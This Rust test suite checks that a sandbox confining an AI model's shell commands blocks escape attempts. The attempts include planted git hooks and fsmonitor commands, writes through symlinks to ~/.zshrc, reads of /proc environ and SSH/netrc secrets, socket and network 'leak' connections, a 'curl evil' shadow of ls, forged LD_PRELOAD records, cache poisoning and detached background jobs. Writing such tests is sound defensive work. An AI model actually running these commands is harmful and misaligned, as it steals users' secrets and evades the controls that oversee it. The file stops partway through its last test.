//! The escape suite (the spec's sections 4.4 and 16.2): every attack must fail, and the
//! host must show no effect. Each test sets up the attack outside, runs the model's
//! line through the real launcher, and checks the host afterwards.

use std::fs;
use std::io::Read;
use std::net::{TcpListener, UdpSocket};
use std::os::linux::net::SocketAddrExt;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::os::unix::net::{SocketAddr, UnixListener};
use std::path::{Path, PathBuf};

use efr_protocol::Grant;
use efr_sandbox::{FloorKind, MaskKind, WriteRoot, WriteRootKind};

use crate::support::{Fixture, Run, command, need, q, sandbox_or_skip, write};

/// The launcher inside the sandbox, which also runs the self-test's system calls.
fn self_test(fixture: &Fixture, check: &str, args: &str) -> String {
    let inside = fixture.spec.runtime.inside_launcher();
    format!("{} self-test --check {check} {args}", q(&inside))
}

/// True when a process whose command line holds `marker` still runs.
fn alive(marker: &str) -> bool {
    let Ok(entries) = fs::read_dir("/proc") else { return false };
    entries.flatten().any(|entry| {
        let cmdline = fs::read(entry.path().join("cmdline")).unwrap_or_default();
        let text = String::from_utf8_lossy(&cmdline).replace('\0', " ");
        text.contains(marker)
    })
}

fn refused(run: &Run, what: &str) {
    assert_ne!(run.result().exit_code, Some(0), "{what} worked: {run:#?}");
}

#[test]
fn escape_write_outside_root_erofs() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let notes = fixture.home.join("notes.txt");
    let run = fixture.run(&format!("print x > {}; print ok > inside.txt", q(&notes)));
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    assert!(!notes.exists());
    assert_eq!(fs::read_to_string(fixture.project.join("inside.txt")).unwrap(), "ok\n");
    assert_eq!(run.result().exit_code, Some(0));
}

#[test]
fn escape_chmod_outside_roots_fails() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let rc = fixture.home.join(".zshrc");
    let run = fixture.run(&format!("chmod 777 {}", q(&rc)));
    refused(&run, "chmod");
    assert_eq!(fs::metadata(&rc).unwrap().permissions().mode() & 0o777, 0o600);
}

#[test]
fn escape_write_git_config_erofs() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    let run = fixture.run("print '[core]\n\tfsmonitor = touch /tmp/x' >> .git/config");
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    let run = fixture.run("git config core.fsmonitor 'touch pwned'");
    refused(&run, "git config");
    let config = fs::read_to_string(fixture.project.join(".git/config")).unwrap();
    assert!(!config.contains("fsmonitor"), "{config}");
}

#[test]
fn escape_git_hooks_readonly() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    let hook = fixture.project.join(".git/hooks/pre-commit");
    let run = fixture.run("print '#!/bin/sh\ntouch ~/pwned' > .git/hooks/pre-commit");
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    assert!(!hook.exists());
}

#[test]
fn escape_rename_git_ebusy() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    let run = fixture.run("mv .git .git2");
    refused(&run, "mv .git");
    assert!(run.stderr.contains("busy"), "{run:#?}");
    assert!(fixture.project.join(".git/config").exists());
    assert!(!fixture.project.join(".git2").exists());
}

#[test]
fn escape_commondir_quarantined() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    let run = fixture.run("print -r -- $HOME/elsewhere > .git/commondir");
    run.expect_status(0);
    let changes = &run.result().summary.surface_changes;
    let change = changes
        .iter()
        .find(|change| change.rule == "commondir_in_main_git_dir")
        .unwrap_or_else(|| panic!("{run:#?}"));
    assert!(change.quarantined);
    assert!(!fixture.project.join(".git/commondir").exists());
    let quarantine = fixture.spec.runtime.sandbox_dir.join("quarantine");
    let calls: Vec<PathBuf> =
        fs::read_dir(&quarantine).unwrap().flatten().map(|e| e.path()).collect();
    assert_eq!(calls.len(), 1);
    assert!(calls[0].join("entries.json").exists());
}

#[test]
fn escape_new_repo_fsmonitor_reported() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    let run = fixture
        .run("git init -q sub && git -C sub config core.fsmonitor 'touch ~/pwned' && cd sub");
    run.expect_status(0);
    let change = run
        .result()
        .summary
        .surface_changes
        .iter()
        .find(|change| change.path == fixture.project.join("sub/.git/config"))
        .unwrap_or_else(|| panic!("{run:#?}"));
    assert_eq!(change.key.as_deref(), Some("core.fsmonitor"));
    assert!(change.quarantined);
    assert!(!fixture.project.join("sub/.git/config").exists());
}

#[test]
fn escape_hooks_symlink_swap_refused() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    // A call cannot replace the bound hooks dir; one with no hooks dir can plant a link,
    // which the guard moves away after the call.
    fs::remove_dir_all(fixture.project.join(".git/hooks")).unwrap();
    let run = fixture.run("ln -s ~/.config .git/hooks");
    run.expect_status(0);
    let planted = run
        .result()
        .summary
        .surface_changes
        .iter()
        .any(|change| change.path == fixture.project.join(".git/hooks") && change.quarantined);
    assert!(planted, "{run:#?}");
    assert!(fs::symlink_metadata(fixture.project.join(".git/hooks")).is_err());
    // A link that is there before a call (another conversation's) refuses the plan.
    symlink(fixture.home.join(".config"), fixture.project.join(".git/hooks")).unwrap();
    let run = fixture.run("true");
    run.expect_status(125);
    let error = run.result().setup_error.clone().unwrap_or_default();
    assert!(error.contains("symbolic link"), "{run:#?}");
}

#[test]
fn escape_core_hookspath_dir_readonly() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    fs::create_dir_all(fixture.project.join(".husky/_")).unwrap();
    let status = command("git")
        .args(["config", "core.hooksPath", ".husky/_"])
        .current_dir(&fixture.project)
        .envs(&fixture.env)
        .status()
        .unwrap();
    assert!(status.success());
    let run = fixture.run("print 'touch ~/pwned' > .husky/_/pre-commit; print ok > .husky/notes");
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    assert!(!fixture.project.join(".husky/_/pre-commit").exists());
    assert!(fixture.project.join(".husky/notes").exists());
}

#[test]
fn escape_agent_configs_readonly() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    fixture.git_init();
    write(&fixture.project.join(".claude/settings.json"), "{}\n");
    write(&fixture.project.join(".mcp.json"), "{}\n");
    for name in [".claude", ".mcp.json"] {
        let path = fixture.project.join(name);
        fixture.floor(&path, FloorKind::ProtectedName);
    }
    let run = fixture.run(
        "print evil > .claude/settings.json; print evil > .mcp.json; print '#direnv' > .envrc",
    );
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    assert_eq!(fs::read_to_string(fixture.project.join(".mcp.json")).unwrap(), "{}\n");
    assert_eq!(fs::read_to_string(fixture.project.join(".claude/settings.json")).unwrap(), "{}\n");
    let reported = run.result().summary.surface_changes.iter().any(|change| {
        change.rule == "protected_name_created" && change.path == fixture.project.join(".envrc")
    });
    assert!(reported, "{run:#?}");
}

#[test]
fn escape_hardlink_exdev() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run("ln ~/.zshrc rc && print evil >> rc");
    refused(&run, "a hard link of ~/.zshrc");
    assert!(run.stderr.contains("cross-device"), "{run:#?}");
    assert_eq!(fs::read_to_string(fixture.home.join(".zshrc")).unwrap(), "# the user's rc\n");
}

#[test]
fn escape_symlink_write_refused() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run("ln -s ~/.zshrc rc && print evil >> rc");
    refused(&run, "a write through a link");
    assert_eq!(fs::read_to_string(fixture.home.join(".zshrc")).unwrap(), "# the user's rc\n");
}

#[test]
fn escape_proc_environ_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run(&format!("cat /proc/{}/environ", std::process::id()));
    refused(&run, "reading another process's environ");
    assert!(!run.stdout.contains("PATH="), "{run:#?}");
}

#[test]
fn escape_proc_fd_reopen_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run(&format!("cat /proc/{}/fd/0 < /dev/null", std::process::id()));
    refused(&run, "reopening another process's descriptor");
}

#[test]
fn escape_proc_root_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run(&format!("ls /proc/{}/root/", std::process::id()));
    refused(&run, "walking another process's root");
}

#[test]
fn escape_resolve_unix_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fs::create_dir(fixture.base.join("k")).unwrap();
    let socket = fixture.base.join("k/u");
    let listener = UnixListener::bind(&socket).unwrap();
    listener.set_nonblocking(true).unwrap();
    let run = fixture.run(&format!("zmodload zsh/net/socket && zsocket {}", q(&socket)));
    refused(&run, "a connect to a socket made outside");
    assert!(run.stderr.contains("permission denied"), "{run:#?}");
    assert!(listener.accept().is_err());
}

#[test]
fn escape_session_bus_denied() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    let bus = fixture.xrt.join("bus");
    let _listener = UnixListener::bind(&bus).unwrap();
    fixture.spec.runtime.session_bus = Some(bus.clone());
    let address = format!("unix:path={}", bus.display());
    fixture.env.insert("DBUS_SESSION_BUS_ADDRESS".into(), address.into());
    let line = format!(
        "print -r -- ${{DBUS_SESSION_BUS_ADDRESS-unset}}; zmodload zsh/net/socket; zsocket {}",
        q(&bus)
    );
    let run = fixture.run(&line);
    refused(&run, "a connect to the session bus");
    assert!(run.stdout.starts_with("unset"), "{run:#?}");
    assert!(run.result().env_removed.contains(&"DBUS_SESSION_BUS_ADDRESS".to_owned()));
}

#[test]
fn escape_system_bus_denied() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    fs::create_dir(fixture.base.join("k")).unwrap();
    let bus = fixture.base.join("k/system");
    let _listener = UnixListener::bind(&bus).unwrap();
    fixture.spec.runtime.system_bus = bus.clone();
    let real = Path::new("/run/dbus/system_bus_socket");
    let mut line = format!("zmodload zsh/net/socket; zsocket {} && exit 0", q(&bus));
    if real.exists() {
        line.push_str(&format!("; zsocket {} && exit 0", q(real)));
    }
    line.push_str("; exit 1");
    let run = fixture.run(&line);
    run.expect_status(1);
    assert!(run.stderr.contains("permission denied"), "{run:#?}");
}

#[test]
fn escape_docker_sock_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fs::create_dir(fixture.base.join("k")).unwrap();
    let docker = fixture.base.join("k/d");
    let _listener = UnixListener::bind(&docker).unwrap();
    let real = Path::new("/var/run/docker.sock");
    let mut line = format!("zmodload zsh/net/socket; zsocket {} && exit 0", q(&docker));
    if real.exists() {
        line.push_str(&format!("; zsocket {} && exit 0", q(real)));
    }
    line.push_str("; exit 1");
    fixture.run(&line).expect_status(1);
}

#[test]
fn escape_abstract_socket_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let name = format!("efr-sbx-escape-{}", std::process::id());
    let address = SocketAddr::from_abstract_name(name.as_bytes()).unwrap();
    let listener = UnixListener::bind_addr(&address).unwrap();
    listener.set_nonblocking(true).unwrap();
    let run =
        fixture.run(&self_test(&fixture, "abstract_socket", &format!("--abstract-name {name}")));
    run.expect_status(0);
    assert!(run.stdout.contains("\"ok\":true"), "{run:#?}");
    assert!(listener.accept().is_err());
}

#[test]
fn escape_signal_outside_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let pid = std::process::id();
    let run = fixture.run(&format!("kill -0 {pid}"));
    refused(&run, "a signal to a process outside");
    let run = fixture.run(&self_test(&fixture, "signal_outside", &format!("--outside-pid {pid}")));
    run.expect_status(0);
}

#[test]
fn escape_tcp_unreachable() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    let port = listener.local_addr().unwrap().port();
    let run = fixture.run(&format!(
        "zmodload zsh/net/tcp; ztcp 127.0.0.1 {port} && exit 0; ztcp 192.0.2.1 9 && exit 0; exit 1"
    ));
    run.expect_status(1);
    assert!(listener.accept().is_err());
    let run = fixture.run(&self_test(&fixture, "tcp", "--tcp 192.0.2.1:9"));
    run.expect_status(0);
}

#[test]
fn escape_udp_unreachable() {
    let ready = sandbox_or_skip!();
    need!("bash");
    let fixture = Fixture::new(&ready);
    let socket = UdpSocket::bind("127.0.0.1:0").unwrap();
    socket.set_nonblocking(true).unwrap();
    let port = socket.local_addr().unwrap().port();
    let run = fixture.run(&format!(
        "bash -c 'echo leak > /dev/udp/127.0.0.1/{port}; echo leak > /dev/udp/192.0.2.1/9'"
    ));
    assert!(run.stderr.contains("unreachable"), "{run:#?}");
    let mut buffer = [0_u8; 64];
    assert!(socket.recv(&mut buffer).is_err(), "a datagram left the sandbox");
}

#[test]
fn escape_dns_unreachable() {
    let ready = sandbox_or_skip!();
    need!("getent");
    let fixture = Fixture::new(&ready);
    let run = fixture.run("getent hosts example.com");
    refused(&run, "a DNS lookup");
    assert!(run.stdout.is_empty(), "{run:#?}");
}

#[test]
fn escape_loopback_inside_works() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run(
        "zmodload zsh/net/tcp && ztcp -l 41234 && l=$REPLY && ztcp 127.0.0.1 41234 && \
         ztcp -a $l && print loopback-ok",
    );
    run.expect_status(0);
    assert!(run.stdout.contains("loopback-ok"), "{run:#?}");
}

#[test]
fn escape_nested_userns_denied() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.run(&self_test(&fixture, "nested_userns", "")).expect_status(0);
    if crate::support::have("unshare") {
        refused(&fixture.run("unshare -U true"), "a nested user namespace");
    }
}

#[test]
fn escape_io_uring_eperm() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run(&self_test(&fixture, "io_uring", ""));
    run.expect_status(0);
    assert!(run.stdout.contains("errno 1"), "{run:#?}");
}

#[test]
fn escape_vsock_eafnosupport() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.run(&self_test(&fixture, "vsock", "")).expect_status(0);
}

#[test]
fn escape_tiocsti_eperm() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run(&self_test(&fixture, "tiocsti", ""));
    run.expect_status(0);
    assert!(run.stdout.contains("errno 1"), "{run:#?}");
}

/// A system call through python's ctypes: prints its errno.
fn ctypes_call(name: &str, args: &str) -> String {
    format!(
        "python3 -c 'import ctypes, platform; libc = ctypes.CDLL(None, use_errno=True); \
         nr = {{\"x86_64\": {{\"keyctl\": 250, \"ptrace\": 101}}, \"aarch64\": {{\"keyctl\": 219, \
         \"ptrace\": 117}}}}[platform.machine()][\"{name}\"]; \
         r = libc.syscall(nr, {args}); print(\"result\", r, \"errno\", ctypes.get_errno())'"
    )
}

#[test]
fn escape_keyctl_eperm() {
    let ready = sandbox_or_skip!();
    need!("python3");
    let fixture = Fixture::new(&ready);
    // KEYCTL_GET_KEYRING_ID (0) of the session keyring (-3).
    let run = fixture.run(&ctypes_call("keyctl", "0, -3, 0"));
    run.expect_status(0);
    assert!(run.stdout.contains("result -1 errno 1"), "{run:#?}");
}

#[test]
fn escape_ptrace_eperm() {
    let ready = sandbox_or_skip!();
    need!("python3");
    let fixture = Fixture::new(&ready);
    // PTRACE_TRACEME (0).
    let run = fixture.run(&ctypes_call("ptrace", "0, 0, 0, 0"));
    run.expect_status(0);
    assert!(run.stdout.contains("result -1 errno 1"), "{run:#?}");
}

#[test]
fn escape_daemon_sock_hidden() {
    // The launcher's side: efr's runtime roots are empty inside. The daemon's side (a
    // connect from an approved exit child gets read scope) is the daemon's test.
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let socket = fixture.runtime.join("ds");
    let _listener = UnixListener::bind(&socket).unwrap();
    fs::create_dir(fixture.xrt.join("efr")).unwrap();
    let xrt_socket = fixture.xrt.join("efr/ds");
    let _other = UnixListener::bind(&xrt_socket).unwrap();
    let run = fixture.run(&format!(
        "[[ -e {} || -e {} ]] && exit 0; ls -A {}; exit 1",
        q(&socket),
        q(&xrt_socket),
        q(&fixture.runtime)
    ));
    run.expect_status(1);
    // Only the editor stub comes back into the masked runtime root, at its own path.
    assert_eq!(run.stdout.trim(), "zsh", "{run:#?}");
}

#[test]
fn escape_efr_db_hidden() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let db = fixture.data.join("efr.sqlite");
    fs::write(&db, b"SQLite format 3").unwrap();
    let scratch = &fixture.spec.runtime.scratch;
    let run = fixture.run(&format!("cat {}; print ok > {}/note", q(&db), q(scratch)));
    assert!(run.stderr.to_lowercase().contains("no such file"), "{run:#?}");
    assert!(!run.stdout.contains("SQLite"));
    assert!(scratch.join("note").exists());
}

#[test]
fn escape_secret_masks_empty() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    write(&fixture.home.join(".ssh/id_ed25519"), "PRIVATE KEY\n");
    write(&fixture.home.join(".netrc"), "machine x password hunter2\n");
    let (ssh, netrc) = (fixture.home.join(".ssh"), fixture.home.join(".netrc"));
    fixture.mask(&ssh, MaskKind::EngineSecret);
    fixture.mask(&netrc, MaskKind::EngineSecret);
    let run = fixture.run("ls -A ~/.ssh; cat ~/.netrc; print x > ~/.ssh/key");
    assert!(!run.stdout.contains("id_ed25519"), "{run:#?}");
    assert!(!run.stdout.contains("hunter2"), "{run:#?}");
    assert!(!fixture.home.join(".ssh/key").exists());
}

#[test]
fn escape_env_secret_names_removed() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    let secrets = [
        ("GITHUB_TOKEN", "ghp_secretvalue1"),
        ("AWS_SECRET_ACCESS_KEY", "awssecretvalue2"),
        ("SSH_AUTH_SOCK", "/run/user/1000/ssh-agent"),
        ("EFR_LOG", "debug"),
        ("HTTPS_PROXY", "http://proxy.invalid"),
    ];
    for (name, value) in secrets {
        fixture.env.insert(name.into(), value.into());
    }
    let run = fixture.run("env");
    run.expect_status(0);
    let result = fs::read_to_string(run.call_dir.join("result.json")).unwrap();
    for (name, value) in secrets {
        assert!(!run.stdout.contains(value), "{name} reached the sandbox: {run:#?}");
        assert!(run.result().env_removed.contains(&name.to_owned()), "{name}");
        assert!(!result.contains(value), "a value reached result.json");
    }
    assert!(run.stdout.contains("EFR_SANDBOX=1"));
}

#[test]
fn escape_inherited_fd_closed() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let secret = fixture.base.join("secret");
    fs::write(&secret, "inherited-secret\n").unwrap();
    let call_dir = fixture.prepare("ls /proc/self/fd; cat <&7; cat /dev/fd/7");
    let mut wrapper = command("zsh");
    wrapper
        .args(["-fc", "exec 7<$1; shift; exec \"$@\"", "zsh"])
        .arg(&secret)
        .arg(&ready.bin)
        .args(["run", "--call-dir"])
        .arg(&call_dir)
        .current_dir(&fixture.project)
        .env_clear()
        .envs(&fixture.env)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    let run = fixture.collect(&call_dir, crate::support::run_with_timeout(wrapper));
    assert!(!run.stdout.contains("inherited-secret"), "{run:#?}");
    assert!(run.result().started);
}

#[test]
fn escape_background_job_killed() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.run("sleep 9876.1 &!; sleep 0.2; print started").expect_status(0);
    assert!(!alive("sleep 9876.1"));
}

#[test]
fn escape_setsid_job_killed() {
    let ready = sandbox_or_skip!();
    need!("setsid");
    let fixture = Fixture::new(&ready);
    fixture.run("setsid sleep 9876.2 & sleep 0.2; print started").expect_status(0);
    assert!(!alive("sleep 9876.2"));
}

#[test]
fn escape_sudo_nnp_refused() {
    // The user's rule: no real sudo, not even inside. The sandbox's side of the attack
    // is what makes sudo refuse: no_new_privs and no capability.
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let run = fixture.run("grep -E '^(NoNewPrivs|CapEff|CapPrm):' /proc/self/status");
    run.expect_status(0);
    assert!(run.stdout.contains("NoNewPrivs:\t1"), "{run:#?}");
    assert!(run.stdout.contains("CapEff:\t0000000000000000"), "{run:#?}");
    assert!(run.stdout.contains("CapPrm:\t0000000000000000"), "{run:#?}");
}

#[test]
fn escape_overlay_cache_poison_stays_private() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    let cargo = fixture.home.join(".cargo");
    let source = cargo.join("registry/src/index/dep-1.0.0/src/lib.rs");
    write(&source, "pub fn orig() {}\n");
    fixture.cache(&cargo);
    let poison = format!("print 'pub fn evil() {{}}' > {}", q(&source));
    fixture.run(&poison).expect_status(0);
    assert_eq!(fs::read_to_string(&source).unwrap(), "pub fn orig() {}\n");
    let run = fixture.run(&format!("cat {}", q(&source)));
    assert!(run.stdout.contains("evil"), "the conversation keeps its own layer: {run:#?}");
    fixture.switch_conversation();
    let run = fixture.run(&format!("cat {}", q(&source)));
    assert!(run.stdout.contains("orig"), "another conversation saw the poison: {run:#?}");
}

#[test]
fn escape_forged_records_kept_out() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    let ssh = fixture.home.join(".ssh");
    fs::create_dir(&ssh).unwrap();
    fixture.mask(&ssh, MaskKind::EngineSecret);
    let line = format!(
        "print -rn -- $'efr-records\\0v1\\0cwd\\0'{}$'\\0export\\0LD_PRELOAD\\0/tmp/x.so\\0\
         export\\0PATH\\0/tmp/evil\\0end\\0'0$'\\0' >&3; exit 0",
        q(&ssh)
    );
    let run = fixture.run(&line);
    run.expect_status(0);
    let fields = run.apply_fields();
    assert!(!fields.iter().any(|field| field.contains(".ssh")), "{run:#?}");
    assert!(!fields.iter().any(|field| field == "LD_PRELOAD" || field == "PATH"), "{run:#?}");
    assert!(run.result().summary.dropped.contains(&"LD_PRELOAD".to_owned()));
    let state = fs::read_to_string(fixture.spec.runtime.shell_dir.join("state.zsh")).unwrap();
    assert!(!state.contains("LD_PRELOAD"), "{state}");
}

#[test]
fn escape_config_link_target_ro_in_dotfiles_project() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    let dotfiles = fixture.home.join("dotfiles");
    write(&dotfiles.join("efr/config.toml"), "[permissions]\nmode = \"manual\"\n");
    let config = fixture.config.join("config.toml");
    fs::remove_file(&config).unwrap();
    symlink(dotfiles.join("efr/config.toml"), &config).unwrap();
    fixture.spec.write_roots =
        vec![WriteRoot { path: dotfiles.clone(), kind: WriteRootKind::TurnProject }];
    fixture.floor(&config, FloorKind::Config);
    let run = fixture.call(
        "print 'mode = \"auto\"' >> efr/config.toml; print ok > notes",
        &dotfiles,
        |_| {},
    );
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    let text = fs::read_to_string(dotfiles.join("efr/config.toml")).unwrap();
    assert!(!text.contains("auto"), "{text}");
    assert!(dotfiles.join("notes").exists());
}

#[test]
fn escape_npmrc_link_target_masked() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    write(&fixture.project.join("npmrc"), "//registry.npmjs.org/:_authToken=npm_secret\n");
    let link = fixture.home.join(".npmrc");
    symlink(fixture.project.join("npmrc"), &link).unwrap();
    fixture.mask(&link, MaskKind::EngineSecret);
    fixture.floor(&link, FloorKind::ToolConfig);
    let run = fixture.run("cat npmrc ~/.npmrc");
    assert!(!run.stdout.contains("npm_secret"), "{run:#?}");
}

#[test]
fn escape_worktree_gitfile_commondir_cannot_widen_roots() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    fixture.git_init();
    let worktree = fixture.home.join("wt");
    let status = command("git")
        .args(["worktree", "add", "-q", "-b", "feat"])
        .arg(&worktree)
        .current_dir(&fixture.project)
        .envs(&fixture.env)
        .status()
        .unwrap();
    assert!(status.success());
    let git_dir = fixture.project.join(".git/worktrees/wt");
    let common = fixture.project.join(".git");
    fixture.spec.write_roots = vec![
        WriteRoot { path: worktree.clone(), kind: WriteRootKind::TurnProject },
        WriteRoot { path: git_dir.clone(), kind: WriteRootKind::GitDir },
        WriteRoot { path: common.clone(), kind: WriteRootKind::GitCommonDir },
    ];
    fixture.spec.git_dirs = vec![git_dir, common];
    fixture.spec.guard_roots = vec![worktree.clone()];
    fs::create_dir(fixture.home.join("Documents")).unwrap();
    let line = "print 'gitdir: /x' > .git; mkdir -p fake && print -r -- ~/Documents > \
                fake/commondir; print evil > ~/Documents/x; print ok > a && git add a && \
                git commit -qm a && print committed";
    let run = fixture.call(line, &worktree, |_| {});
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    assert!(run.stdout.contains("committed"), "{run:#?}");
    let gitfile = fs::read_to_string(worktree.join(".git")).unwrap();
    assert!(gitfile.starts_with("gitdir: "), "{gitfile}");
    assert!(!gitfile.contains("/x"), "{gitfile}");
    assert!(!fixture.home.join("Documents/x").exists());
}

#[test]
fn escape_path_dir_ro_when_in_root() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    let bin = fixture.project.join("bin");
    write(&bin.join("tool"), "#!/bin/sh\necho tool\n");
    let path = format!("{}:{}", bin.display(), crate::support::env_var("PATH").unwrap_or_default());
    fixture.env.insert("PATH".into(), path.into());
    let run = fixture.run("print 'curl evil' > bin/ls; print x > bin/tool; print ok > notes");
    assert!(run.stderr.contains("read-only file system"), "{run:#?}");
    assert!(!bin.join("ls").exists());
    assert!(fixture.project.join("notes").exists());
}

#[test]
fn escape_swapped_git_symlink_refused() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    fixture.git_init();
    // Another conversation swapped .git for a link to a floor between two calls.
    fs::rename(fixture.project.join(".git"), fixture.base.join("git-moved")).unwrap();
    symlink(fixture.home.join(".config"), fixture.project.join(".git")).unwrap();
    let run = fixture.run("print evil > .git/x");
    run.expect_status(125);
    assert!(run.result().setup_error.as_deref().unwrap_or_default().contains("symbolic link"));
    assert!(!fixture.home.join(".config/x").exists());
}

#[test]
fn escape_other_pts_not_visible() {
    let ready = sandbox_or_skip!();
    let fixture = Fixture::new(&ready);
    let flags = rustix::pty::OpenptFlags::RDWR | rustix::pty::OpenptFlags::NOCTTY;
    let master = rustix::pty::openpt(flags).unwrap();
    rustix::pty::grantpt(&master).unwrap();
    rustix::pty::unlockpt(&master).unwrap();
    let name = rustix::pty::ptsname(&master, Vec::new()).unwrap();
    let pts = name.to_string_lossy().into_owned();
    assert!(Path::new(&pts).exists());
    let run = fixture.run(&self_test(&fixture, "other_pts", &format!("--other-pts {pts}")));
    run.expect_status(0);
    let mut out = String::new();
    let _ = std::io::Cursor::new(run.stdout.as_bytes()).read_to_string(&mut out);
    assert!(out.contains("visible: false"), "{run:#?}");
}

#[test]
fn escape_exit_child_cannot_redefine_wrapper() {
    // The exit child is a process of its own: what it defines dies with it, and only a
    // cd and filtered exports come back.
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    fixture.spec.launch = efr_sandbox::SpecLaunch::Unsandboxed;
    let run = fixture.run("_efr_hs_sbx() { print evil }; alias ls='rm -rf'; export RUST_LOG=x");
    run.expect_status(0);
    let fields = run.apply_fields();
    assert_eq!(fields, ["export", "RUST_LOG", "x"], "{run:#?}");
    assert!(!fixture.spec.runtime.shell_dir.join("state.zsh").exists());
}

#[test]
fn write_grant_widens_one_call_only() {
    let ready = sandbox_or_skip!();
    let mut fixture = Fixture::new(&ready);
    let notes = fixture.home.join("notes");
    fs::create_dir(&notes).unwrap();
    fixture.run(&format!("print a > {}/n", q(&notes))).expect_status(1);
    fixture.grant(Grant::Write { path: notes.clone() });
    fixture.run(&format!("print a > {}/n", q(&notes))).expect_status(0);
    fixture.spec.grants.clear();
    fixture.run(&format!("print b > {}/n", q(&notes))).expect_status(1);
    assert_eq!(fs::read_to_string(notes.join("n")).unwrap(), "a\n");
}

#[test]
fn escape_tcsetpgrp_to_shell_fails() {
    // A terminal of its own with a job-control zsh as its session leader, which runs the
    // launcher as a foreground job, as the hidden zsh does. A sandboxed process tries to
    // give the terminal back to the shell's process group, which has no number in the
    // call's pid namespace.
    let ready = sandbox_or_skip!();
    need!("setsid", "python3");
    let fixture = Fixture::new(&ready);
    let flags = rustix::pty::OpenptFlags::RDWR | rustix::pty::OpenptFlags::NOCTTY;
    let master = rustix::pty::openpt(flags).unwrap();
    rustix::pty::grantpt(&master).unwrap();
    rustix::pty::unlockpt(&master).unwrap();
    let name = rustix::pty::ptsname(&master, Vec::new()).unwrap();
    let slave = || {
        std::os::unix::fs::OpenOptionsExt::custom_flags(
            fs::OpenOptions::new().read(true).write(true),
            i32::try_from(rustix::fs::OFlags::NOCTTY.bits()).unwrap(),
        )
        .open(name.to_string_lossy().as_ref())
        .unwrap()
    };
    let line = "sleep 0.5; python3 -c 'import os; os.tcsetpgrp(0, \
                int(open(\"shell-pgid\").read()))' && print terminal-moved || \
                print terminal-refused";
    let call_dir = fixture.prepare(line);
    let mut shell = command("setsid");
    shell
        .args(["-c", "zsh", "-f", "-i", "-c", "\"$0\" run --call-dir \"$1\"; exit $?"])
        .arg(&ready.bin)
        .arg(&call_dir)
        .current_dir(&fixture.project)
        .env_clear()
        .envs(&fixture.env)
        .stdin(slave())
        .stdout(slave())
        .stderr(slave());
    let mut child = shell.spawn().unwrap();
    // The command holds its copies of the slave until it drops.
    drop(shell);
    fs::write(fixture.project.join("shell-pgid"), child.id().to_string()).unwrap();
    let reader = std::thread::spawn(move || {
        let mut text = Vec::new();
        let _ = fs::File::from(master).read_to_end(&mut text);
        String::from_utf8_lossy(&text).into_owned()
    });
    child.wait().unwrap();
    let text = reader.join().unwrap();
    assert!(text.contains("terminal-refused"), "{text}");
